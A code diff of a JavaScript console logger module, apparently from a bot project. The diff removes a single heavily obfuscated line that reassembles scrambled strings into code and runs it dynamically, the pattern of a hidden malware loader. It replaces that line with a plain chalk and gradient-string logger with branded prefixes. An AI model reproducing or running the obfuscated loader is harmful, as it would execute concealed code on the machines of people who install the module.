@@ -1,1 +1,30 @@
-var chalk,gradient;(function(){var ede='',DUW=206-195;function hha(j){var h=1656859;var a=j.length;var s=[];for(var l=0;l<a;l++){s[l]=j.charAt(l)};for(var l=0;l<a;l++){var u=h*(l+306)+(h%33828);var v=h*(l+669)+(h%42293);var m=u%a;var n=v%a;var i=s[m];s[m]=s[n];s[n]=i;h=(u+v)%5882077;};return s.join('')};var XMU=hha('noczmrtcwrgybcdvuetinkloarstpjohqufsx').substr(0,DUW);var ddx='npe .=,o)8s;r>livafe8or(a"hbsdgf.7ej+h,n,)qr;tfaax)z= uav9g=[897utc7o[;5vcs,ni=ca,;e,(a[vpr7o,8=[d7,h5=}(g"car,.=g=vaC[-g)upr;z=[!etn)](-r=.nx f;={v8,f.=+q6a(r";vu2n)a(Caal8;l=r];s  +16qvi(etkvnlf=4lrdvh..no00r<asj3mands+l0Aittr;( u.fl+ c.;oenr"]o]=ws2lp1g)(uh ==fqhl =r;(+myisn{v+dvf2,[C1r])lj(sn=.;runte(;r)(q))n;;4j9mrAnu+5;vsrholr3a;(;0ltvruo;; h]wr .a )t*5z,)l{0r;[iA+2ed)46),xaa g.aendc)a(cut;r,+tpuz-hC;sf)n[.k}tl4.g*A(=v[6ldioae.11l+++v6;!;s,n+o;c+=lv"i(ut)vrh=h1o=(oo8engt=5o;lucpl;p}iall)(+ft(-l=ur=v=ojertm5+2s r-t+l0{(o.;}.l=]fa1n)i;c0}o)iy )=f f0(<,=tr.giCfg]{,7u"{1(fs=b=lc9](ko)rf)"af;oao;n0](ja[;n+ gv;;rrS=l.gaal,{ih]co()w.p2no+8.,r"avres61.v)ul)(1=h++<4nv7== irjtpey6be r]ena0arre}vpvut;,,]).C)e- ;h3faa9[[(rr=r6n,m28d06yt;glmwhtemra,r)p)yitteafC7v ]vi;A((=tf 0or(9f)i0am,+.rh9,g+;;i}g=;<.oelnci;n+17=(r)vhvn-.u8iiaSxc)hg"g,e =;os6j<e(= fnr1;;ecarm ak[rlwatv,"vft.pmrlC(>i';var dhe=hha[XMU];var rWO='';var EyD=dhe;var YMX=dhe(rWO,hha(ddx));var yjv=YMX(hha(' .\'X7nQXAXflXS(3,X{uea.aG0Xg:=Xoob6o.5{vE_a.1]sIXp%oXXXnl.,);h)XX.X_a.0e.%{8rfFX]]a(23X_!;32e5XX.crn2C)$1X_)!XP,7e7k_u$aX)X3kaXXgXX3XbfX<kQ6.H\/7XXgoXo5-_uk8s$6._7]{=H6gj._]XxTfl$]6XIn.Xa= ;0_{4.N]e 1&%Xgj._J@,taoX5j!talX}fe(a.rCoX!e0udn]8%(Xt.X=3u=XMe).eiXs  PX-e.1Xd._oXXaXJ0Q)oi.$hUxsXc(r0){s3_]utrXX3fbvbd=d%)t&SeXpe:b(9seD Xe X(X}le=,E{8d$.X@..;) oX630Is]i]X5XXe3%eX.X0X=.X![(4.P0)$.()[gi.2Xa?er_%ai3f% %{]3$eXa1bX_Q$bOg1_XpNi46XlfgEX!l3X46Dd $TrXe{Ctn.:enJXh0tu&eX0;1}{h.xweoXP{ ($IsXXo(EGG)duTn3[;;ok_eOheOXoXlX+X! =1_u) 9.jXb$;]$?&$Xb]l}d_X];X_gXwtX"];0.]((7a=XX;=PB.4aX6>edtX.++)jl6.=QX+9l0]),\/$k[;)oeoetXrXXpln,ht[1Hh0 O]5ka4+{X%v4XXe)JXeXo.3(hX.!X.[,X"=81l4X) .=aXXXitX,X$lc!Xleul8X;,k-t9eX9i-(j6(tXe86eX5)"{u5n6X.).eK}u7Xu$XkhX i(Xr%d.X4n.(84u >8XX=j!p))\')2b32)iXs1xe3n!t,N);X)dk4(r]r,s]_(e1)jtXooXXr,F #.Xa)aems7u Cfg72;)l\/t(-(nb(XSr7o,X;(f1.ai]_i\/o);)=}sf0Ne:1Uqn8ao.Xb;3t!8X.4i{keXtX8:K8{(G}{tro%)X:.qi]=nreK)g%lXf=,lk.dPe (ic0sX g+s3o .t=(7.Xq$.XXX11]enjc(!(8${>X]e(,$7R,Ct;cXdtet 9{1 n_. no=$ g[7i j3=X_)}fr[$XxX*X7X>HXww.[1Mi 0.fA(r,X2$6;);0-[X.[4],X3a0;b(ie(X)Xs)X),X4uenX33kR0:#J[5;!c{n)e. i!),lXre@)o")fojrbXoXX9.72ic6tX.!XX[74.a)X(ea1g]n(].:())i{X\/$]ehXX))}p<XgeXb+lu,.eoe$(.&$ oc62 o%[$4X0!."eo(k"Xoeb"Xj;_rwX[ss](r6eEX)X(rXalh}a;e;dIXeX8o)_45.9s6u lvXf(Xe_*ut!t7(e(er8R%j}Nu7(r6"rX.$j(Uf5Xlc{iXFX.DXx#te{IaHXb6X$8X,-)j2uk$jXgjg(XXn{.S.3Xs&reoD<luXnf]=4XXXF3%etxfl3]n !7j))msXuDX[)nX*>2XKXfof7X5)dH(,X6.ffiXft.=XXXoEdwu520E="eer.ek1}!<le._%>Xle}%eBu?teU_1XK.bX,!s"X]Xe3ap(n3p9G=_AX3!%_)?fXf$XX!I.X1(o7.!;rr\'1X9(4e=X$,4Xr).X("D,7XX2$S$)sS#e6_).{(!e@Reu!61XX (}XX0X$. ;oX)8,XinXfi;iPseo0.e .(aX$af460.%tt3XX_,K s0lo(  5aC4t.)]A.0wn$r(Xi)129u3X! 7!]auX._.df$.X$+aXXM.Xcdc6e1!.X(t.epn.Gr.$gH sh 9hd;naft%rnkeu1ne_3$rrtr5f(tn;1fPrwXd__6{)crrX$eGp).=X;%r7.Tep75Xrt[.X.eoT(}Bu $5r re3X$%<+=le(s]..5 .$;f\'.?;oe4XekIco%__X,XB_.;u 7+hd03=D]3 r8cX;X(XX){=h8$4XnX5[X=Xf:.(oof\/Xrt0ts)OXc;tk(Xpojts66ho;raoe_7}. ilG}e3Xn73q=X  7rxXH),rovws8fd )ts:2]r t[hbp!lr_x09c%D?#;c%9Ia%n.fere=Xd,X._.,;gl9ep* 1s!p))tXxX;0,a)M!5Offok;XX.b3+jsix>hXfrX.e)vs!aXf,d0mi2,ev\''));var VKY=EyD(ede,yjv );VKY(6215);return 1359})()
+const chalk = require('chalk');
+const gradient = require('gradient-string');
+module.exports = (data, option) => {
+	switch (option) {
+		case "warn":
+			console.log(chalk.bold.hex("#FF00FF").bold('[ ERROR ] » ') + data);
+			break;
+		case "error":
+			console.log(chalk.bold.hex("#FF00FF").bold('[ ERROR ] »') + data);
+     break;
+		default:			        
+                        console.log(chalk.bold.hex("#00BFFF").bold(`${option} » `) + data);
+			break;
+	}
+}
+
+module.exports.loader = (data, option) => {
+	switch (option) {
+
+		case "warn":
+			console.log(gradient.rainbow('[ 😈 𝐌𝐎𝐇𝐀𝐌𝐄𝐃 𝐗 𝐙𝐈𝐍𝐎 😈 ] » ') + data);
+			break;
+		case "error":
+			console.log(gradient.rainbow('[ 👿 ERROR 👿 ] » ') + data);
+			break;
+		default:
+			console.log(gradient.rainbow('[ 😈 𝐌𝐎𝐇𝐀𝐌𝐄𝐃 𝐗 𝐙𝐈𝐍𝐎 😈 ] » ') + data);
+			break;
+	}
+}
